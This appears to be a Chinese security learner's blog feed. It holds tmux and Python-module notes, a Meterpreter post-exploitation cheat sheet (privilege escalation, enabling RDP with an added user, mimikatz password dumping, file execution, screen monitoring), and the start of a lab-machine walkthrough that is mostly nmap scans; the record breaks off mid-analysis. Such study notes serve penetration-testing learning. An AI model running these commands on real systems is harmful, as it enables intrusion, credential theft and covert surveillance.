    
    
    
    <entry>
      <title>tmux终端复用</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/tmux%20%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/tmux%20%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="放大缩小终端字体"><a href="#放大缩小终端字体" class="headerlink" title="放大缩小终端字体"></a>放大缩小终端字体</h2><ul><li>ctrl  + shift + + ——放大</li><li>ctrl  +  -             ——缩小</li></ul><h2 id="tmux使用（终端复用）"><a href="#tmux使用（终端复用）" class="headerlink" title="tmux使用（终端复用）"></a>tmux使用（终端复用）</h2><h3 id="ctrl-b是快捷键的启动命令，按下这两个键后，后续的一个命令才对tmux生效"><a href="#ctrl-b是快捷键的启动命令，按下这两个键后，后续的一个命令才对tmux生效" class="headerlink" title="ctrl + b是快捷键的启动命令，按下这两个键后，后续的一个命令才对tmux生效"></a>ctrl + b是快捷键的启动命令，按下这两个键后，后续的一个命令才对tmux生效</h3><ul><li><p>shift + “上下拆分</p></li><li><p>shift + % 左右拆分</p></li></ul><ul><li>alt + 方向键 调整窗口</li><li>z 窗口最大化，还原 相互切换 （zoom）</li></ul><ul><li>ctrl + b 然后随便按方向键可以把光标切到任意的一个窗口的位置</li></ul><h2 id="终端光标移动"><a href="#终端光标移动" class="headerlink" title="终端光标移动"></a>终端光标移动</h2><ul><li>ctrl + a 移动到开头</li><li>ctrl + e 移动到结尾</li></ul><ul><li>alt + b 往左移动一个词（back</li><li>alt + f  往右移动一个词（forward</li></ul>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> tmux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python模块</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python%E6%A8%A1%E5%9D%97/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-模块"><a href="#Python-模块" class="headerlink" title="Python 模块"></a>Python 模块</h1><blockquote><p>模块基本上就是一个 包含了所有你定义的函数和变量的文件。模块的文件名必须以. py为扩展名。</p></blockquote><h2 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Filename: using_sys.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;The command line arguments are:&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line"><span class="built_in">print</span> (i)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;\n\nThe PYTHONPATH is&#x27;</span>, sys.path, <span class="string">&#x27;\n&#x27;</span>) </span><br></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>The command line arguments are:<br>test.py</p><p>The PYTHONPATH is [‘/home/lkk’, ‘/usr/lib/python38.zip’, ‘/usr/lib/python3.8’, ‘/usr/lib/python3.8/lib-dynload’, ‘/usr/local/lib/python3.8/dist-packages’, ‘/usr/lib/python3/dist-packages’] </p></blockquote><p>3：输出命令行输入的参数“python3 test.py”</p><p>7：输出python的路径</p><h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><p>Python的os模块（Operating System Interface）是一个提供与操作系统交互的标准库模块，它允许你执行各种与文件和目录操作以及系统信息获取相关的任务</p><blockquote><p>以下是一些常见的功能和用途</p><ol><li>文件和目录操作：<ul><li>创建目录：<code>os.mkdir()</code>或<code>os.makedirs()</code></li><li>删除文件或目录：<code>os.remove()</code>和<code>os.rmdir()</code></li><li>重命名文件或目录：<code>os.rename()</code></li><li>检查文件或目录是否存在：<code>os.path.exists()</code></li><li>获取文件属性信息：<code>os.stat()</code></li></ul></li><li>目录遍历：<ul><li>列出目录中的文件和子目录：<code>os.listdir()</code></li><li>递归遍历目录中的所有文件：使用递归函数和<code>os.path</code>模块</li></ul></li><li>路径操作：<ul><li>连接路径：<code>os.path.join()</code></li><li>获取文件名和目录名：<code>os.path.basename()</code>和<code>os.path.dirname()</code></li><li>获取文件的绝对路径：<code>os.path.abspath()</code></li></ul></li><li>系统信息获取：<ul><li>获取当前工作目录：<code>os.getcwd()</code></li><li>更改当前工作目录：<code>os.chdir()</code></li><li>获取环境变量：<code>os.environ</code></li></ul></li><li>执行系统命令：<ul><li>使用<code>os.system()</code>执行系统命令</li><li>使用<code>subprocess</code>模块执行系统命令的更强大方法</li></ul></li><li>权限和权限管理：<ul><li>设置文件或目录的权限：<code>os.chmod()</code></li><li>获取文件或目录的权限：<code>os.access()</code></li></ul></li><li>文件路径处理：<ul><li>拆分文件路径：<code>os.path.split()</code></li><li>获取文件扩展名：<code>os.path.splitext()</code></li></ul></li><li>其他系统级操作：<ul><li>获取系统信息：<code>os.uname()</code>（在Unix/Linux系统中）</li><li>获取文件大小：<code>os.path.getsize()</code></li><li>获取文件最后修改时间：<code>os.path.getmtime()</code></li></ul></li></ol></blockquote><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><p>Python的<code>re</code>模块是正则表达式操作的标准库，它提供了一种强大的文本模式匹配和搜索功能。正则表达式是一种用于描述文本模式的特殊字符串，可以用来检查字符串是否匹配某种模式，查找匹配的子字符串，替换文本，分割文本等。</p><blockquote><p>以下是<code>re</code>模块的一些常见用途：</p><ol><li>正则表达式匹配：<ul><li><code>re.match(pattern, string)</code>: 从字符串的开头开始匹配模式。</li><li><code>re.search(pattern, string)</code>: 在整个字符串中查找第一个匹配的模式。</li><li><code>re.findall(pattern, string)</code>: 查找所有匹配的模式，返回一个列表。</li><li><code>re.finditer(pattern, string)</code>: 查找所有匹配的模式，返回一个可迭代对象。</li></ul></li><li>匹配对象的操作：<ul><li>一旦找到匹配，可以从匹配对象中获取匹配的文本、位置等信息。</li></ul></li><li>正则表达式替换：<ul><li><code>re.sub(pattern, replacement, string)</code>: 替换字符串中的模式为指定的文本。</li><li><code>re.subn(pattern, replacement, string)</code>: 类似<code>re.sub()</code>，但返回替换后的字符串和替换次数。</li></ul></li><li>正则表达式分割：<ul><li><code>re.split(pattern, string)</code>: 使用模式将字符串分割成列表。</li></ul></li><li>正则表达式的修饰符：<ul><li>通过修饰符可以修改正则表达式的匹配行为，例如忽略大小写、多行匹配等。</li></ul></li><li>正则表达式的特殊字符：<ul><li>正则表达式支持各种特殊字符，如<code>.</code>（匹配任意字符）、<code>*</code>（匹配前一个字符零次或多次）、<code>+</code>（匹配前一个字符一次或多次）、<code>?</code>（匹配前一个字符零次或一次）等。</li></ul></li><li>分组和捕获：<ul><li>正则表达式可以使用圆括号创建捕获组，以便从匹配中提取特定部分。</li></ul></li></ol></blockquote><h2 id="更新中"><a href="#更新中" class="headerlink" title="更新中"></a>更新中</h2>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meterpreter常用命令</title>
      <link href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/meterpreter%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/meterpreter%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="meterpreter命令"><a href="#meterpreter命令" class="headerlink" title="meterpreter命令"></a>meterpreter命令</h1><h2 id="获取system权限"><a href="#获取system权限" class="headerlink" title="获取system权限"></a>获取system权限</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><h3 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><h3 id="以下已过时"><a href="#以下已过时" class="headerlink" title="以下已过时"></a>以下已过时</h3><h3 id="开启windows远程桌面3389"><a href="#开启windows远程桌面3389" class="headerlink" title="开启windows远程桌面3389"></a>开启windows远程桌面3389</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">run getgui -e</span><br></pre></td></tr></table></figure><h3 id="开启远程桌面并添加一个新用户bean"><a href="#开启远程桌面并添加一个新用户bean" class="headerlink" title="开启远程桌面并添加一个新用户bean"></a>开启远程桌面并添加一个新用户bean</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u bean -p <span class="number">123456</span></span><br></pre></td></tr></table></figure><h3 id="开启远程桌面并绑定在8888端口"><a href="#开启远程桌面并绑定在8888端口" class="headerlink" title="开启远程桌面并绑定在8888端口"></a>开启远程桌面并绑定在8888端口</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e -f <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><h2 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h2><blockquote><p>需要借助mimikatz 猕猴桃模块，现在改用kiwi模块了</p></blockquote><p>步骤如下：</p><blockquote><ol><li>get uid查看以下用户名和权限</li></ol>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><ol start="2"><li>查看密码</li></ol>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure></blockquote><h2 id="上传下载执行"><a href="#上传下载执行" class="headerlink" title="上传下载执行"></a>上传下载执行</h2><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /xxx/xxx</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download /xxx/xxx</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -f &lt;<span class="built_in">path</span>&gt; [options]</span><br></pre></td></tr></table></figure><h2 id="截图、监控相关"><a href="#截图、监控相关" class="headerlink" title="截图、监控相关"></a>截图、监控相关</h2><h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure><h3 id="屏幕监控"><a href="#屏幕监控" class="headerlink" title="屏幕监控"></a>屏幕监控</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshare</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> meterpreter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> meterpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>West Wild 1.1</title>
      <link href="/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/WestWild%201.1/"/>
      <url>/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/WestWild%201.1/</url>
      
        <content type="html"><![CDATA[<h1 id="West-Wild-1-1"><a href="#West-Wild-1-1" class="headerlink" title="West Wild 1.1"></a>West Wild 1.1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>靶机ip为192.168.31.9</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT --min-rate=<span class="number">10000</span> -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/ports</span><br></pre></td></tr></table></figure><p>以最低10000的速率扫描全部的端口，并把扫描结果以全格式输出到指定目录</p><blockquote><p>扫描结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT --min-rate=<span class="number">10000</span> -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/ports</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">14</span> <span class="number">14</span>:<span class="number">16</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WestWild (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">0013</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">65531</span> closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  open  ssh</span><br><span class="line"><span class="number">80</span>/tcp  open  http</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">49</span>:E0:<span class="number">2</span>E (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3</span>.<span class="number">67</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><h4 id="tcp扫描"><a href="#tcp扫描" class="headerlink" title="tcp扫描"></a>tcp扫描</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p22,<span class="number">80</span>,<span class="number">139</span>,<span class="number">445</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>-sT：使用tcp协议进行扫描</p><p>-sV：探测服务版本</p><p>-sC：使用默认脚本</p><p>-O：探测操作系统</p><p>-p：指定端口</p><blockquote><p>扫描结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT -sC -sV -O -p22,<span class="number">80</span>,<span class="number">139</span>,<span class="number">445</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/detail</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">14</span> <span class="number">14</span>:<span class="number">24</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WestWild (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span>/tcp  open  ssh         OpenSSH <span class="number">6</span>.<span class="number">6</span>.<span class="number">1</span>p1 Ubuntu <span class="number">2</span>ubuntu2.<span class="number">13</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">104594</span>fea72f028a9b211a31c5033048 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9794178618</span>e28e7a738e412076ba5173 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">2381</span>c776bb3778ee3b73e255ad813272 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp  open  http        Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">7</span> ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/<span class="number">2</span>.<span class="number">4</span>.<span class="number">7</span> (Ubuntu)</span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (text/html).</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp open  netbios-ssn Samba smbd <span class="number">4</span>.<span class="number">3</span>.<span class="number">11</span>-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">49</span>:E0:<span class="number">2</span>E (VMware)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 3.<span class="title">X</span>|4.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:4</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 3.2 - 4.9</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">script</span> <span class="title">results</span>:</span></span><br><span class="line"><span class="function">|<span class="title">_clock</span>-<span class="title">skew</span>: <span class="title">mean</span>: -1<span class="title">h00m00s</span>, <span class="title">deviation</span>: 1<span class="title">h43m55s</span>, <span class="title">median</span>: 0<span class="title">s</span></span></span><br><span class="line"><span class="function">| <span class="title">smb2</span>-<span class="title">security</span>-<span class="title">mode</span>: </span></span><br><span class="line"><span class="function">|   311: </span></span><br><span class="line"><span class="function">|<span class="title">_</span>    <span class="title">Message</span> <span class="title">signing</span> <span class="title">enabled</span> <span class="title">but</span> <span class="title">not</span> <span class="title">required</span></span></span><br><span class="line"><span class="function">| <span class="title">smb</span>-<span class="title">security</span>-<span class="title">mode</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">account_used</span>: <span class="title">guest</span></span></span><br><span class="line"><span class="function">|   <span class="title">authentication_level</span>: <span class="title">user</span></span></span><br><span class="line"><span class="function">|   <span class="title">challenge_response</span>: <span class="title">supported</span></span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">message_signing</span>: <span class="title">disabled</span> (<span class="title">dangerous</span>, <span class="title">but</span> <span class="title">default</span>)</span></span><br><span class="line"><span class="function">|<span class="title">_nbstat</span>: <span class="title">NetBIOS</span> <span class="title">name</span>: <span class="title">WESTWILD</span>, <span class="title">NetBIOS</span> <span class="title">user</span>: &lt;<span class="title">unknown</span>&gt;, <span class="title">NetBIOS</span> <span class="title">MAC</span>: 000000000000 (<span class="title">Xerox</span>)</span></span><br><span class="line"><span class="function">| <span class="title">smb2</span>-<span class="title">time</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">date</span>: 2023-10-14<span class="title">T06</span>:25:00</span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">start_date</span>: <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function">| <span class="title">smb</span>-<span class="title">os</span>-<span class="title">discovery</span>: </span></span><br><span class="line"><span class="function">|   <span class="title">OS</span>: <span class="title">Windows</span> 6.1 (<span class="title">Samba</span> 4.3.11-<span class="title">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|   <span class="title">Computer</span> <span class="title">name</span>: <span class="title">westwild</span></span></span><br><span class="line"><span class="function">|   <span class="title">NetBIOS</span> <span class="title">computer</span> <span class="title">name</span>: <span class="title">WESTWILD</span>\<span class="title">x00</span></span></span><br><span class="line"><span class="function">|   <span class="title">Domain</span> <span class="title">name</span>: \<span class="title">x00</span></span></span><br><span class="line"><span class="function">|   <span class="title">FQDN</span>: <span class="title">westwild</span></span></span><br><span class="line"><span class="function">|<span class="title">_</span>  <span class="title">System</span> <span class="title">time</span>: 2023-10-14<span class="title">T09</span>:25:00+03:00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 14.13 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><p>重点关注漏洞脚本扫描结果 “Host script results”</p></blockquote><h4 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/udp</span><br></pre></td></tr></table></figure><p>-sU：指定使用udp协议</p><p>–top-ports：指定扫描前20个端口</p><blockquote><p>扫描结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# sudo nmap -sU --top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span> -oA nmapscan/udp</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">14</span> <span class="number">14</span>:<span class="number">28</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WestWild (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">9</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00043</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line"><span class="number">53</span>/udp    closed        domain</span><br><span class="line"><span class="number">67</span>/udp    closed        dhcps</span><br><span class="line"><span class="number">68</span>/udp    open|filtered dhcpc</span><br><span class="line"><span class="number">69</span>/udp    closed        tftp</span><br><span class="line"><span class="number">123</span>/udp   closed        ntp</span><br><span class="line"><span class="number">135</span>/udp   closed        msrpc</span><br><span class="line"><span class="number">137</span>/udp   open          netbios-ns</span><br><span class="line"><span class="number">138</span>/udp   open|filtered netbios-dgm</span><br><span class="line"><span class="number">139</span>/udp   closed        netbios-ssn</span><br><span class="line"><span class="number">161</span>/udp   closed        snmp</span><br><span class="line"><span class="number">162</span>/udp   closed        snmptrap</span><br><span class="line"><span class="number">445</span>/udp   closed        microsoft-ds</span><br><span class="line"><span class="number">500</span>/udp   closed        isakmp</span><br><span class="line"><span class="number">514</span>/udp   closed        syslog</span><br><span class="line"><span class="number">520</span>/udp   closed        route</span><br><span class="line"><span class="number">631</span>/udp   closed        ipp</span><br><span class="line"><span class="number">1434</span>/udp  closed        ms-sql-m</span><br><span class="line"><span class="number">1900</span>/udp  closed        upnp</span><br><span class="line"><span class="number">4500</span>/udp  closed        nat-t-ike</span><br><span class="line"><span class="number">49152</span>/udp closed        unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">49</span>:E0:<span class="number">2</span>E (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15</span>.<span class="number">39</span> seconds</span><br></pre></td></tr></table></figure><p>虽然udp扫描的端口有不稳定的因素，当遇到特殊情况或者需要找一些新的信息的时候可能要用到udp扫描结果</p></blockquote><h2 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h2><h3 id="分析扫描结果"><a href="#分析扫描结果" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h3><blockquote><p>22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</p></blockquote><p>22端口，openssh 6.1.1 版本不算特别高。但是22 ssh服务有漏洞的可能性极小。</p><blockquote><p>80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Site doesn’t have a title (text/html).</p></blockquote><p>80端口，apache服务，推测是一个网站服务器</p><blockquote><p>| smb-os-discovery:<br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: westwild<br>|   NetBIOS computer name: 